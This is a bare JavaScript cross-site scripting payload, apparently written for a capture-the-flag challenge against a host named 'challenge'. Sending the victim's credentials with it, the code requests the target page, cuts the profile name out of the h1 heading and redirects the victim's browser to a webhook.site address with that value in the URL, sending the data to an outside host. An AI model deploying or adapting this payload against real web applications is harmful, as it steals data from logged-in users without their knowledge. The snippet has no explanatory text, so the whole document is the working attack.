var r = new XMLHttpRequest();
r.open("GET", "http://challenge:8080/", true); 
r.onreadystatechange = function() { 
    if (r.readyState == 4){
        var res = r.response.split('\'s Profile')[0].split('<h1>')[1].replace(/\s/g, '');
        window.location = 'https://webhook.site/d8b954b5-bb14-49c5-a9f0-832f01ff7978/q=' + res;
    }
};
r.withCredentials = true;
r.send();
